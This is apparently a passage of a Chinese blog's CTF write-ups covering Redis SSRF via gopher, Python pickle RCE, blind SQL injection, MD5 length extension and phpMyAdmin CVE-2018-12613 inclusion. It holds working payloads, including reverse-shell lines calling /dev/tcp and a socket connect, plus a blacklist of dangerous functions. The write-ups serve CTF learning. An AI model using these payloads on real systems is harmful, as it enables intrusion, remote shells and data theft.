gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2438%0D%0A%0A%0A%3C%3Fphp%20echo%20system%28%27cat%20/flag%27%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A","tags":[{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://dddwmr.github.io/tags/BUUCTF/"}]},{"title":"Python反序列化","date":"2020-12-31T00:00:00.000Z","path":"2020/12/31/Python反序列化/","text":"Python反序列化简介Python 的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。python序列化出来的是pickle流，这是一种栈语言。 pickle简介 pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。PVM 由三部分组成：指令处理器从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。最终留在栈顶的值将被作为反序列化对象返回。栈区stack由 Python 的 list 实现，被用来临时存储数据、参数以及对象。标签区memo由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储。 PVM操作码 //pickle.py 重点关注 c：读取新的一行作为模块名module，读取下一行作为对象名object，然后将module.object压入到堆栈中。 (：将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。 t：从堆栈中弹出对象，直到一个“(”被弹出，并创建一个包含弹出对象（除了“(”）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。 S：读取引号中的字符串直到换行符处，然后将它压入堆栈。 R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。 .：结束pickle。 几个不同类型的python反序列化例子 python 2、3使用的pickle协议版本不同，但却是向下兼容的，这里不再过多阐述他们之间的区别。 漏洞成因 python的pickle反序列化之所以会造成一些漏洞，是因为其内部存在一个魔术方法_ reduce _，其底层方法为R指令码。这个方法可以返回String和tuple类型的值，而在返回值为tuple时，就可以实现任意命令执行。 _ reduce _：当序列化以及反序列化的过程中中碰到一无所知的扩展类型(这里指的就是新式类)的时候，可以通过类中定义的reduce方法来告知如何进行序列化或者反序列化 关于新式类和旧式类： ​ http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/ 当返回值是一个元祖的时候（2-5个参数），第一个参数是可调用（callable）的对象，第二个是该对象所需的参数元组。在这种情况下，反序列化时会自动执行reduce里面的操作。 //python2 import pickle import os class A(object): def __reduce__(self): return (os.system,('ls',)) a = A() test = pickle.dumps(a) print test pickle.loads(test) 执行结果 反弹shell脚本 import pickle import os class A(object): def __reduce__(self): shell = \"\"\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\"\"\" return (os.system,(shell,)) a=A() result = pickle.dumps(a) pickle.loads(result) 绕过黑名单(各种例题)函数黑名单2018-XCTF-HITB-WEB : Python’s-Revenge中，黑名单如下： black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen] 题解 class Exploit(object): def __reduce__(self): return map,(os.system,[\"ls\"]) 另外的解就是用platform.popen()。 顺便记录一下好用函数 eval, execfile, compile, open, file, map, input, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe, os.listdir, os.access, os.execl, os.execle, os.execlp, os.execlpe, os.execv, os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads,cPickle.load,cPickle.loads, subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen, commands.getstatusoutput,commands.getoutput,commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive, dircache.listdir,dircache.opendir, io.open, popen2.popen2,popen2.popen3,popen2.popen4, timeit.timeit,timeit.repeat, sys.call_tracing, code.interact,code.compile_command,codeop.compile_command, pty.spawn, posixfile.open,posixfile.fileopen, platform.popen ------ map(__import__('os').system,['bash -c \"bash -i >&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2>&amp;1\"',]) sys.call_tracing(__import__('os').system,('bash -c \"bash -i >&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2>&amp;1\"',)) platform.popen(\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"127.0.0.1\\\",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\") 彻底过滤R指令码c指令码 GLOBAL = b'c' # push self.find_class(modname, name); 2 string args 可以看到c指令码通过引用find_class实现功能。find_class读取全局变量，并规定以\\n为分割， find_class(module, name) 如有必要，导入 module 模块并返回其中名叫 name 的对象，其中 module 和 name 参数都是 str 对象。注意，不要被这个函数的名字迷惑， find_class() 同样可以用来导入函数。 子类可以重载此方法，来控制加载对象的类型和加载对象的方式，从而尽可能降低安全风险。参阅 限制全局变量 获取更详细的信息。 引发一个 审计事件 pickle.find_class 附带参数 module、name。 这道题就是直接过滤R，使R指令彻底不能用了。而问题是我们并不知道test.name,test.date的值。 import pickle import test import base64 class Stu(): def __init__(self,name,date): self.name = name self.date = date def __eq__(self,other): return type(other) == type(self) and self.name == other.name and self.date==other.date #a=pickle.dumps(Stu('dwm2','2021')) #print(pickletools.optimize(a)) def check(data): if (b'R' in data): return 'Hacker!!!' x = pickle.loads(data) if (x != Stu(test.name,test.date)): return 'False!!!' return 'Success!' print(check(base64.b64decode(input()))) 我们先正常输出一个序列值。 b'\\x80\\x03c__main__\\nStu\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x04\\x00\\x00\\x00dwm2X\\x04\\x00\\x00\\x00dateX\\x04\\x00\\x00\\x002021ub.' 以他为标准构造payload,将X\\x04\\x00\\x00\\x00dwm2替换为ctest\\nname\\n;将X\\x04\\x00\\x00\\x002021替换为ctest\\ndate\\n。 即 b'\\x80\\x03c__main__\\nStu\\n)\\x81}(X\\x04\\x00\\x00\\x00namectest\\nname\\nX\\x04\\x00\\x00\\x00datectest\\ndate\\nub.' #再base64编码一下 print(base64.b64encode(b'\\x80\\x03c__main__\\nStu\\n)\\x81}(X\\x04\\x00\\x00\\x00namectest\\nname\\nX\\x04\\x00\\x00\\x00datectest\\ndate\\nub.')) ------ #payload gANjX19tYWluX18KU3R1CimBfShYBAAAAG5hbWVjdGVzdApuYW1lClgEAAAAZGF0ZWN0ZXN0CmRhdGUKdWIu 输出成功 绕过c指令module限制上面知道c指令码通过引用find_class实现功能，而find_class是可以被重写的。如果和下面的代码一样，重写的类中只允许c指令包含main这一个module： import pickle import test import base64 import io import sys class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == '__main__': return getattr(sys.modules['__main__'], name) raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load() class Stu(): def __init__(self,name,date): self.name = name self.date = date def __eq__(self,other): return type(other) == type(self) and self.name == other.name and self.date==other.date #a=pickle.dumps(Stu('dwm2','2021')) #print(pickletools.optimize(a)) def check(data): if (b'R' in data): return 'Hacker!!!' x = pickle.loads(data) if (x != Stu(test.name,test.date)): return 'False!!!' return 'Success!' print(check(base64.b64decode(input()))) 这里有一个知识点：通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改。 那我们的思路就变成了通过篡改test.py中的name和date的值以达成目标。 构造payload具体操作如下： 引入test这个moudle:__ main __.test。命名空间在main中，不会被过滤。 把dict格式的数据，{‘name’:’123’,’date’:’456’}压入栈中。 执行BUILD命令，篡改test.name和test.date。 弹掉栈顶，使栈为空。 压入一个标准的Stu对象，它的name和date的值分别是123和456。 payload b'\\x80\\x03c__main__\\ntest\\n}(Vname\\nV123\\nVdate\\nV456\\nub0c__main__\\nStu\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00123X\\x04\\x00\\x00\\x00dateX\\x03\\x00\\x00\\x00456ub.' 篡改后的序列化字符串格式 传入编码后的payload，可以看到输出success。此时test.name和test.date的值是123和456。 不用reduce的RCE方法这里利用的是b指令码。b指令码用来更新对象的属性。 def load_build(self): stack = self.stack state = stack.pop() inst = stack[-1] setstate = getattr(inst, \"__setstate__\", None) if setstate: #如果__setstate__存在，state就由它来处理 setstate(state) return slotstate = None if isinstance(state, tuple) and len(state) == 2: state, slotstate = state if state: #不存在就将state这个dict放入inst.__dict中 try: d = inst.__dict__ try: for k, v in state.iteritems(): d[intern(k)] = v except TypeError: d.update(state) except RuntimeError: for k, v in state.items(): setattr(inst, k, v) if slotstate: for k, v in slotstate.items(): setattr(inst, k, v) dispatch[BUILD] = load_build 还是接上面的题目。如果在Stu中利用{‘__ setstate __ ‘: os.system}build一个对象，那么这个对象的__ setstate __ 现在就是os.system了。之后以’ls /‘再次build一个对象，这个对象的__ setstate __已经是os.system，也就成功RCE了。 payload b'\\x80\\x03c__main__\\nStu\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubVls /\\nb.' 命令执行成功。 工具pker https://github.com/eddieivan01/pker 参考：http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/ https://zhuanlan.zhihu.com/p/89132768 https://www.v0n.top/2020/03/29/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","tags":[{"name":"Python反序列","slug":"Python反序列","permalink":"http://dddwmr.github.io/tags/Python反序列/"}]},{"title":"i春秋新春战‘疫’复现","date":"2020-03-04T00:00:00.000Z","path":"2020/03/04/I春秋新春战‘疫’复现/","text":"i春秋新春战‘疫’WEB复现这个假期过得确实太颓了，再不学习是真的要凉凉。 反思反思反思… 还是做题太少了。 ezsqli首先常规输下1,2回显不同 输入1 or 回显SQL Injection Checked. 这里or被过滤（其实这里直接or返回的是bool(false)，可能间接说明用的不是preg_match?没想清楚是怎么写的，参考别人的wp应该是题目与原题有出入） fuzz一下过滤了的关键词 其中的information被过滤意味着我们常规的查表语句无法使用，就需要有其他数据库来代替它： MySQL5.7的新增了sys schemma，基础数据来自于performance_schema和information_schema两个库，本身数据库不存储数据。（需要root权限） sys.schema_auto_increment_columns schema_table_statistics_with_buffer x$schema_table_statistics_with_buffer sys.x$schema_flattened_keys … 诸如此类还有很多能应用的库。 参考：https://www.anquanke.com/post/id/193512 可是这个库不包含列名，所以又涉及到无列名注入的知识点。 但无列名注入通常依托union来实现，而这里的union也被过滤了（原题情况是union select不能连用）。 如果表中仅有一列：substr((select * from table),1,1)=‘x’即可实现目的。 但本题中不止一列，需要将查询语句与相同数量的列进行比较，进行盲注 。 例如： 执行select (select &#39;1&#39;,&#39;e~&#39;)&gt;(select * from table2 limit 1)显示0 执行select (select &#39;1&#39;,&#39;f~&#39;)&gt;(select * from table2 limit 1)显示1 执行select (select &#39;1&#39;,&#39;fl~&#39;)&gt;(select * from table2 limit 1)显示1 所以可以进行盲注但问题在于，mysql默认不区分大小写，因此这种形式只有在flag仅为大/小写时适用。（比如本题） 而区分大小写需要使用 SELECT CONCAT(“A”, CAST(0 AS JSON)) 来另其返回二进制字符串。 综上，脚本如下 # -*- coding:utf8 -*- import requests import string url = \"http://55e66a5c-d66a-4320-bf74-210dd4750bd7.node3.buuoj.cn/index.php\" def exp1(): str1 = ('0123456789'+string.ascii_letters+string.punctuation).replace(\"'\",\"\").replace('\"','').replace('\\\\','') flag = '' select = 'select group_concat(table_name) from sys.x$schema_flattened_keys' for j in range(1,40): for i in str1: paylaod = \"1 &amp;&amp; (select substr(({}),{},1))='{}'\".format(select, j, i) #print(paylaod) data = { 'id': paylaod, } r = requests.post(url,data=data) if 'Nu1L' in r.text: flag += i print(flag) break def exp2():#区分大小写(应该是环境有问题 跑不出) str1 = ('-0123456789'+string.ascii_uppercase+string.ascii_lowercase+string.punctuation).replace(\"'\",\"\").replace('\"','').replace('\\\\','') flag = '' flag_table_name = 'f1ag_1s_h3r3_hhhhh' for j in range(1,39): for i in str1: i = flag+i paylaod = \"1&amp;&amp;((select 1,concat('{}~',CAST('0' as json))) &lt; (select * from {}))\".format(i,flag_table_name) #print(paylaod) data = { 'id': paylaod, } r = requests.post(url,data=data) if 'Nu1L' not in r.text: flag=i print(flag) break def exp3():#不区分大小写 flag = '' for i in range(1,99): for n in range(32,126): a=chr(n).encode().hex() payload = \"1&amp;&amp;((select 1,0x%s7e)>(select * from f1ag_1s_h3r3_hhhhh))\"%(flag.encode().hex()+a) data = {'id': payload} req = requests.post(url, data) print(payload) print(req.text) if 'Nu1L' in req.text: print(chr(n)) flag += chr(n) print(flag) break if __name__ == '__main__': exp1() exp2() exp3() 参考：https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/ https://blog.csdn.net/a3320315/article/details/104476566 https://blog.csdn.net/qq_42967398/article/details/104472352?fps=1&amp;locationNum=2 持续更新…","tags":[{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://dddwmr.github.io/tags/BUUCTF/"},{"name":"无列名无unionselect注数据","slug":"无列名无unionselect注数据","permalink":"http://dddwmr.github.io/tags/无列名无unionselect注数据/"},{"name":"无in注表名","slug":"无in注表名","permalink":"http://dddwmr.github.io/tags/无in注表名/"}]},{"title":"HASH长度扩展攻击","date":"2019-11-29T21:26:59.000Z","path":"2019/11/30/md5扩展攻击/","text":"因为遇到了相关题目，下面以md5为例，写一下md5的工作原理和对hash扩展攻击的理解。 md5的工作原理如下图所示 其中笼统的一共可以分为四个部分 *Padding填充 *Length填充长度 *初始化向量 *复杂的函数运算（这里可以忽略） 大体概括：md5是分组加密。加密时以每512bit(64byte=&gt;16个数字)为一组，从第一组开始，与四个固定的初始化向量进行复杂运算，进而得到四个新的向量，再将计算得到的向量作为下一组运算的初始向量继续运算。 但是显而易见我们加密的字符大多数情况下不能正好为64byte，md5以填充的方式解决这个问题。 Padding填充填多少 md5根据消息的长度来确定填充的字节数，由于64byte中最后的8byte用来存储原消息长度，故 填充后消息长度 mod 512 = 448 (512-8*8) bit eg.如果信息是‘message’ -&gt; 7byte -&gt; 56bit，那么就填充392bit。 填啥 使用二进制补位 10000000 … 转成十六进制就是第一个字节是0x80，剩余数据用 0x00 填充。 承上面那个例子，那么这里要填 0x80 + 0x00 *48 填充消息长度 这里需要注意长度是小端存储的，即高字节存放在高地址中。 初始化向量A 01 23 45 67 0x67452301B 89 AB CD EF 0xEFCDAB89C FE DC BA 98 0x98BADCFED 76 54 32 10 0x10325476 以上是四个固定的初始化向量，他们也是小端存储。 再与补位后的消息进行复杂运算后，还是上面的‘message’例子，最终得到的md5值是78e731027d8fd50ed642340b7c9a63b3。 MD5长度扩展攻击攻击原理MD5拓展攻击正是针对加盐措施的一种升级后的攻击手段，我们可以在不知道盐的情况下得出加盐后的md5的值。但需要在以下条件才能实现： 1.我们要知道salt的长度。(为了能得到正确的填充）2.要知道任意一个由salt加密后的md5值，并且知道没有加盐的明文。3.用户可以提交md5值。 例如我们知道一条信息的MD5值是78e731027d8fd50ed642340b7c9a63b3，我们还同时得知信息内容为message，可以构造出下图（这里的信息可以替换成salt+已知信息，加盐情况下需要知道salt长度） 然后它与初始向量复杂运算，得到 A=0x0231e778B=0x0ed58f7dC=0x0b3442d6D=0xb3639a7c 也就是上面的MD5值。 若在已补位后的消息后继续追加字符串‘admin’， 则会对其再次进行补位成为第二组。 他会把上面得出的这组值作为初始向量，并与他进行复杂运算。这样会得到最终的md5值e53a681a30ff99e3f6522270ca7db244。 这个值是md5（消息+填充+追加消息）。实际上就是md5(message+admin)的值。 原理实现已知salt长度实验吧–让我进去 &lt;?php &lt;html> &lt;body> &lt;pre> $flag = \"XXXXXXXXXXXXXXXXXXXXXXX\"; $secret = \"XXXXXXXXXXXXXXX\"; // This secret is 15 characters long for security! $username = $_POST[\"username\"]; $password = $_POST[\"password\"]; if (!empty($_COOKIE[\"getmein\"])) { if (urldecode($username) === \"admin\" &amp;&amp; urldecode($password) != \"admin\") { if ($COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password))) { echo \"Congratulations! You are a registered user.\\n\"; die (\"The flag is \". $flag); } else { die (\"Your cookies don't match up! STOP HACKING THIS SITE.\"); } } else { die (\"You are not an admin! LEAVE.\"); } } setcookie(\"sample-hash\", md5($secret . urldecode(\"admin\" . \"admin\")), time() + (60 * 60 * 24 * 7)); if (empty($_COOKIE[\"source\"])) { setcookie(\"source\", 0, time() + (60 * 60 * 24 * 7)); } else { if ($_COOKIE[\"source\"] != 0) { echo \"\"; // This source code is outputted here } } &lt;/pre> &lt;h1>Admins Only!&lt;/h1> &lt;p>If you have the correct credentials, log in below. If not, please LEAVE.&lt;/p> &lt;form method=\"POST\"> Username: &lt;input type=\"text\" name=\"username\"> &lt;br> Password: &lt;input type=\"password\" name=\"password\"> &lt;br> &lt;button type=\"submit\">Submit&lt;/button> &lt;/form> &lt;/body> &lt;/html> 分析判断条件 if (urldecode($username) === \"admin\" &amp;&amp; urldecode($password) != \"admin\") { if ($COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password))) 只要user始终为admin,pw的值不为admin就可达成条件 同时已知user=admin，pw=admin的 sample-hash=571580b26c65f306376d4f64e53cb5c7（从cookie得到） 题中给出salt长度为15 这里就可以使用md5扩展攻击，在原基础上添加任意消息即可达成目的。 工具hashpump 因为user值不变，也相当于salt的一部分，所以data直接填admin，salt长度为20（15+5） $$f599284f8f2116348036a3f46e79c12b$$传到cookie的getmein里 $$password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00dwm2$$由于还有个urldecode,转下码post上去得到flag。 //HashPump下载 $$git clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmakemake install$$ 未知salt长度Jarvis OJ–flag在管理员手里 &lt;?php $auth = false; $role = \"guest\"; $salt = if (isset($_COOKIE[\"role\"])) { $role = unserialize($_COOKIE[\"role\"]);//需要传入被序列化的数据 $hsh = $_COOKIE[\"hsh\"]; if ($role===\"admin\" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[\"role\"]))) { //strrve函数反转字符串 $auth = true; } else { $auth = false; } } else { $s = serialize($role); setcookie('role',$s); $hsh = md5($salt.strrev($s)); setcookie('hsh',$hsh); } if ($auth) { echo \"&lt;h3>Welcome Admin. Your flag is } else { echo \"&lt;h3>Only Admin can see the flag!!&lt;/h3>\"; } ?> //只截取了PHP部分 分析代码，flag输出条件是 $role===”admin” &amp;&amp;hsh===md5($salt.strrev($_COOKIE[“role”])) 这里得到$salt.strrev(s:5:”guest”;)的hsh，即$salt.’;&quot;tseug&quot;:5:s’的md5值： hsh=3a4727d57463f122833d9e732f94e4e0 以上是已知条件。 满足第一个条件只需要比较时$role开头是admin,接下来的字符是’\\0’即可。 结合条件二，就可以这样构造 s:5:”admin”;+padding+s:5:”guest”; 而问题在于我们并不知道salt的长度 ===&gt;可以写脚本爆破(借脚本参考) #!/usr/bin/python # -*- coding=utf -*- import requests,hashpumpy,urllib def webre(): url = 'http://web.jarvisoj.com:32778/' sha = '3a4727d57463f122833d9e732f94e4e0' string0 = ';\"tseug\":5:s' string1 = ';\"nimda\":5:s' for i in range(15): digest, message = hashpumpy.hashpump(sha,string0,string1,i) payload ={'role':urllib.quote(message[::-1]), 'hsh':digest} // quote()用于把url编码， [::-1]用于反转字符 print(i,payload) html = requests.get(url,cookies=payload).content if 'Welcome' in html: print(html) webre() hashpump库使用说明 hashpump(...) hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message) Arguments: hexdigest(str): Hex-encoded result of hashing key + original_data. original_data(str): Known data used to get the hash result hexdigest. data_to_add(str): Data to append key_length(int): Length of unknown data prepended to the hash Returns: A tuple containing the new hex digest and the new message. &gt;&gt;&gt; hashpumpy.hashpump(&#39;ffffffff&#39;, &#39;original_data&#39;, &#39;data_to_add&#39;, len(&#39;KEYKEYKEY&#39;)) (&#39;e3c4a05f&#39;, &#39;original_datadata_to_add&#39;)===&gt; 也可以用bp爆破 参考： https://blog.csdn.net/qq1045553189/article/details/87566846 https://err0rzz.github.io/2017/09/18/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/","tags":[{"name":"HASH","slug":"HASH","permalink":"http://dddwmr.github.io/tags/HASH/"}]},{"title":"jarvis OJ WEB WP","date":"2019-11-13T00:00:00.000Z","path":"2019/11/13/Jarvis OJ(web)WP/","text":"jarvis OJ神盾局打开网页是一张图片查看源码发现 base64转码发现后面是shield.jpg尝试一下 index.php发现如下源码 大概就是如果传入的class值不为空 就把这个值赋给g再把g反序列化后赋给x输出将x传入readfile后的值再看一下 shield.php 看见他告诉flag在 pctf.php 里 如果传入的值不为空 且值中不存在.. 且不含/ 和\\\\才能到file_get_contents函数读取文件 又读了一下showimg.php 这就解释了为什么刚才直接读pctf.php显示FILE NOT FOUND写个脚本 O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;}把这个值传入注意！！是class不是之前的img 而且是从原页面上传入 得到flag admin看源码啥也没有看一眼robots.txt 进这个文件 发现是假flag抓包admin随便改个值得到flag in a mess查看源码 分析传入的a里如果不为0.则echo hahah并return没有.就继续向下运行 给$data赋值从$a里读到的值如果data值等于 1112 is a nice lab!,id==0,b的长度大于5且b的第一个值是4 又要求b的第一个值不能等于4才能运行flag.txt每个条件都存在冲突id php弱比较就能绕过 传入id=0ea 看见file_get_contents函数想到文件包含 不知道有什么文件含这个字符串先放一下b eregi可以%00截断 b=%0041111111查了下大佬的wp说a这里可以应用伪协议php://input构造payload:?id=0e&amp;a=php://input&amp;b=%004111111同时post值1112 is a nice lab!得到这样的回显Come ON!!! {/^HT2mCpcvOLf} 盲猜他是个地址（长得也太难认了8 进到这样一个界面 看见这样的形势 先测试一下sql注入 确实是sql注入可以看到它这里是过滤了空格 用/*22*/绕过 回显又正常了 先测试字段数 说明字段为3 双写绕过对select和union的过滤数据库名 ?id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,database()查到数据库名是test 表名 id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(table_name)/*22*/frfromom/*22*/information_schema.tables/*22*/where/*22*/table_schema=database() 列名 id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(column_name)/*22*/frfromom/*22*/information_schema.columns/*22*/where/*22*/table_schema=database()/*22*/and/*22*/table_name=0x636f6e74656e74查出来是id,context,title 读文件 id=-1/*22*/uniunionon/*22*/seleselectct/*22*/1,2,context/*22*/frofromm/*22*/content得到flag 持续更新","tags":[{"name":"jarvis OJ","slug":"jarvis-OJ","permalink":"http://dddwmr.github.io/tags/jarvis-OJ/"}]},{"title":"BUUCTF WEB wp","date":"2019-10-21T00:00:00.000Z","path":"2019/10/21/BUUCTFwp/","text":"HCTF2018WarmUp菜鸡发现了一个平台BUUCTF，web第一题就要去查wp，哎查看源码给了source.php,如下 &lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"]; if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file']) ##不能为空 &amp;&amp; is_string($_REQUEST['file']) ##是字符串 &amp;&amp; emmm::checkFile($_REQUEST['file']) ##上面checkfile返回为true ) { include $_REQUEST['file']; exit; } else { echo \"&lt;br>&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\"; } ?> hint.php flag not here, and flag in ffffllllaaaagggg题解构造payload: ?file=hint.php%253f/../../../../ffffllllaaaagggg传入得到flag 具体为啥这么构造，参考下面的漏洞。 解题过程经过搜索这里是phpmyadmin4.8.1远程文件包含漏洞所以先看懂这个漏洞-&gt;做题 phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）漏洞原理一个攻击者可以在服务器上包含（查看和潜在执行）文件的漏洞被发现。该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。攻击者必须经过身份验证，但在这些情况下除外： $_cfg [‘AllowArbitraryServer’] = true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码 $_cfg [‘ServerDefault’] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码 漏洞成因 在index.php里50-63行 $target_blacklist = array ( 'import.php', 'export.php' ); // If we have a valid target, let's load that script instead if (! empty($_REQUEST['target']) &amp;&amp; is_string($_REQUEST['target']) &amp;&amp; ! preg_match('/^index/', $_REQUEST['target']) &amp;&amp; ! in_array($_REQUEST['target'], $target_blacklist) &amp;&amp; Core::checkPageValidity($_REQUEST['target']) ) { include $_REQUEST['target']; exit; } 满足五个条件：$_REQUEST[‘target’]不为空，是字符串，不以index开头，Core::checkPageValidity($REQUEST[‘target’])为真,则包含参数所指定的文件 代码在libraries\\classes\\Core.php 443-476行 Core::checkPageValidity public static function checkPageValidity(&amp;$page, array $whitelist = []) { if (empty($whitelist)) { $whitelist = self::$goto_whitelist; } if (! isset($page) || !is_string($page)) { return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } return false; } 分析代码mb_substr:截取字符串（与substr的区别是它可以截取中文）mb_strpos:匹配（同理，可截取中文）可以看到代码中用了两次有关截取?前字符,判断文件名是否在白名单里的操作第一次很好理解，这里不再叙述phpmyadmin团队考虑到target值后会再跟参数，为了能正确包含文件才使用了第二次截取而就在这里出现了漏洞构造payload:target=db_sql.php%253f/../../test.txt浏览器自行解码一次变成:target=db_sql.php%3f/../../test.txt也就是说传入的数据里没？所以这时的$page没被截取，$_page的值依然等于$page继续往下看，先经过函数urldecode一次变成：target=db_sql.php?/../../test.txt这时候截取到问号前即$_page=db_dql.php, 符合条件通过下面的if判断,接着包含参数所指定的文件，即/../../test.txt(关于这个路径我也不知道是咋来的，我猜就是猜的，嗯)，达到读取test.txt的目的 参考： []: https://www.jianshu.com/p/0d75017c154f [0CTF 2016]piapiapia考点：反序列化逃逸 先扫一波后台发现 www.zip 核心功能在以下三个文件里 同时扫出来的还有注册界面和config.php。鉴于zip文件里没给config.php，猜测flag与此文件有关。 先注个册进入上传页面抓个包。 下面是代码审计部分： 存：传参进profile[]里(update.php)–&gt;profile[]序列化–&gt;updatefile函数(class.php) –&gt;filter函数检测（where-&gt;hacker）–&gt;存数据库 取：反序列化profile–&gt;file_get_contents取profile[$photo]读 可利用之处就在filter函数中对username的检测:若内容存在五位的where则会将它替换为六位的hacker。又因为对photo的值有规定，我们只能考虑重新构造photo,结合以上在这里利用反序列化逃逸。初版构造的photo如下： &quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;} 